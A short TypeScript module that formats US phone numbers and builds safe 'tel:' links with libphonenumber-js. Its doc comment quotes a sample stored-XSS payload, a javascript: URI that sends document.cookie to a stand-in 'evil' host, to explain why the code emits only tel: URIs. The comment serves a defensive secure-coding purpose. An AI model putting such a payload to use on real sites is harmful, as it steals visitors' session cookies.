import parsePhoneNumber from 'libphonenumber-js'

export default function formatPhoneNumber(phoneNumber: string) {
  const parsedPhoneNumber = parsePhoneNumber(phoneNumber, 'US')
  return parsedPhoneNumber?.formatNational() || phoneNumber
}

/**
 * Returns a `tel:` URI for a valid phone number, or an empty string when the
 * input doesn't parse. The phone value is candidate-authored and stored without
 * validation, so it must NOT be passed through verbatim into an href: a value
 * like `javascript:fetch('//evil/'+document.cookie)` would otherwise become an
 * executable link for every site visitor (stored XSS, CWE-79). getURI() only
 * ever yields a `tel:` scheme, so an unparseable value yields no href at all.
 */
export function phoneUri(phoneNumber: string) {
  const parsedPhoneNumber = parsePhoneNumber(phoneNumber, 'US')
  return parsedPhoneNumber?.getURI() ?? ''
}
